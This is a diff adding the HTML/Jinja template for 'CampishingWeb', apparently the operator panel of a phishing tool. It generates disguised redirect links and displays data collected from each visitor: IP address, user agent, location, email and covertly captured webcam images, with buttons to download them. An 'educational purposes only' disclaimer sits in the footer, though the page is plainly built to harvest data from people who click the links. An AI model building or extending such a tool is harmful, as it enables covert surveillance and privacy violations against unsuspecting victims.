@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>URL Redirect Generator</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background: linear-gradient(to right, #f6f9fc, #e9efff);
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background: #ffffff;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+        }
+        .header img {
+            max-width: 120px;
+            height: 50px;
+        }
+        .header h1 {
+            color: #333;
+            margin: 10px 0;
+            font-size: 24px;
+        }
+        .container {
+            max-width: 700px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .form-group label {
+            font-weight: bold;
+            color: #333;
+        }
+        .form-control {
+            border-radius: 8px;
+            border-color: #ddd;
+            padding: 12px;
+        }
+        .btn-primary {
+            background: #4a90e2;
+            border-color: #4a90e2;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+        }
+        .btn-primary:hover {
+            background: #357abd;
+            border-color: #357abd;
+        }
+        .alert {
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 16px;
+        }
+        .image-preview img {
+            border-radius: 8px;
+            border: 2px solid #ddd;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 100%;
+        }
+        .error {
+            color: #e74c3c;
+        }
+        #copyOriginalBtn, #copyShortenedBtn {
+            background: #2ecc71;
+            border-color: #2ecc71;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+        }
+        #copyOriginalBtn:hover, #copyShortenedBtn:hover {
+            background: #27ae60;
+            border-color: #27ae60;
+        }
+        #downloadBtn {
+            background: #e67e22;
+            border-color: #e67e22;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+        }
+        #downloadBtn:hover {
+            background: #d35400;
+            border-color: #d35400;
+        }
+        .loading-spinner {
+            text-align: center;
+            margin: 20px 0;
+        }
+        h2 {
+            color: #333;
+            border-bottom: 2px solid #4a90e2;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        hr {
+            border: 1px solid #eee;
+        }
+        .footer {
+            background: #ffffff;
+            color: #000000;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+            width: 100%;
+        }
+        .footer a {
+            color: #000000;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="/static/logo.png" alt="Logo">
+        <h2>CampishingWeb</h2>
+    </div>
+
+    <div class="container">
+        <form id="urlForm" method="POST" action="/create">
+            <div class="form-group">
+                <label for="url">Target URL</label>
+                <input type="text" class="form-control" id="url" name="url" required>
+                <div class="error" id="urlError"></div>
+            </div>
+            <div class="form-group">
+                <label for="delay">Delay (seconds)</label>
+                <input type="number" class="form-control" id="delay" name="delay" min="0" value="0">
+            </div>
+            <div class="form-group">
+                <label for="email">Email (optional)</label>
+                <input type="email" class="form-control" id="email" name="email">
+                <div class="error" id="emailError"></div>
+            </div>
+            <button type="submit" class="btn btn-primary">Generate Redirect URL</button>
+        </form>
+        <div id="result" class="alert alert-info mt-3" style="display: none;">
+            <p id="originalUrl"></p>
+            <button id="copyOriginalBtn" class="btn btn-primary mt-2" style="display: none;">Copy Original URL</button>
+            <p id="shortenedUrl"></p>
+            <button id="copyShortenedBtn" class="btn btn-primary mt-2" style="display: none;">Copy Shortened URL</button>
+        </div>
+       
+        <hr>
+        
+        <div class="image-preview">
+            <h2 class="mt-4">Collected Data</h2>
+            {% for key, item in data.items() %}
+                <div class="my-4">
+                    <p><strong>ID:</strong> {{ key }}</p>
+                    <p><strong>IP Address:</strong> {{ item.ip_address }}</p>
+                    <p><strong>User Agent:</strong> {{ item.user_agent }}</p>
+                    <p><strong>Location:</strong> {{ item.location }}</p>
+                    <p><strong>Email:</strong> {{ item.email }}</p>
+                    <button id="downloadBtn" class="btn btn-secondary">Download Collected Data</button>
+                    {% if item.webcam_image_path != 'None' %}
+                        <img src="{{ url_for('download_image', image_name=item.webcam_image_path.split('/')[-1]) }}" alt="Webcam Image">
+                        <a href="{{ url_for('download_image', image_name=item.webcam_image_path.split('/')[-1]) }}" class="btn btn-secondary mt-2">Download Collected Image</a>
+                    {% else %}
+                        <p>No image collected.</p>
+                    {% endif %}
+                    <hr>
+                </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div class="footer">
+        <p><a href="/privacy-policy">Privacy Policy</a> | <a href="/terms-of-service">Terms of Service</a></p>
+        <p><small>Disclaimer: The URLs generated are for educational purposes only. We are not responsible for any misuse of this service.</small></p>
+        <p>&copy; 2024 KannadaGamersHub. All rights reserved.</p>
+    </div>
+
+    <script>
+        document.getElementById('urlForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+            const url = document.getElementById('url').value;
+            const delay = document.getElementById('delay').value;
+            const email = document.getElementById('email').value;
+
+            let isValid = true;
+
+            // Reset previous error messages
+            document.getElementById('urlError').textContent = '';
+            document.getElementById('emailError').textContent = '';
+
+            // Validate URL
+            if (!isValidUrl(url)) {
+                document.getElementById('urlError').textContent = 'Please enter a valid URL.';
+                isValid = false;
+            }
+
+            // Validate email (optional)
+            if (email && !isValidEmail(email)) {
+                document.getElementById('emailError').textContent = 'Please enter a valid email address.';
+                isValid = false;
+            }
+
+            if (isValid) {
+                fetch('/create', {
+                    method: 'POST',
+                    body: new URLSearchParams(new FormData(document.querySelector('form')))
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        alert(data.error);
+                    } else {
+                        document.getElementById('result').style.display = 'block';
+                        document.getElementById('originalUrl').innerHTML = `Original URL: <a href="${data.original_url}" target="_blank">${data.original_url}</a>`;
+                        document.getElementById('shortenedUrl').innerHTML = `Shortened URL: <a href="${data.shortened_url}" target="_blank">${data.shortened_url}</a>`;
+                        
+                        // Set the URLs for copying
+                        document.getElementById('copyOriginalBtn').dataset.url = data.original_url;
+                        document.getElementById('copyOriginalBtn').dataset.url = data.original_url;
+                        document.getElementById('copyShortenedBtn').dataset.url = data.shortened_url;
+                        
+                        document.getElementById('copyOriginalBtn').style.display = 'block';
+                        document.getElementById('copyShortenedBtn').style.display = 'block';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        });
+
+        function isValidUrl(url) {
+            try {
+                new URL(url);
+                return true;
+            } catch (_) {
+                return false;
+            }
+        }
+
+        function isValidEmail(email) {
+            // Basic email validation pattern
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        document.getElementById('copyOriginalBtn').addEventListener('click', function () {
+            const originalUrl = this.dataset.url;
+            if (originalUrl) {
+                navigator.clipboard.writeText(originalUrl).then(() => {
+                    alert('Original URL copied to clipboard!');
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                });
+            } else {
+                alert('No URL to copy!');
+            }
+        });
+
+        document.getElementById('copyShortenedBtn').addEventListener('click', function () {
+            const shortenedUrl = this.dataset.url;
+            if (shortenedUrl) {
+                navigator.clipboard.writeText(shortenedUrl).then(() => {
+                    alert('Shortened URL copied to clipboard!');
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                });
+            } else {
+                alert('No URL to copy!');
+            }
+        });
+
+        document.getElementById('downloadBtn').addEventListener('click', function () {
+            window.location.href = '/download_data_to_usr';
+        });
+    </script>
+</body>
+</html>
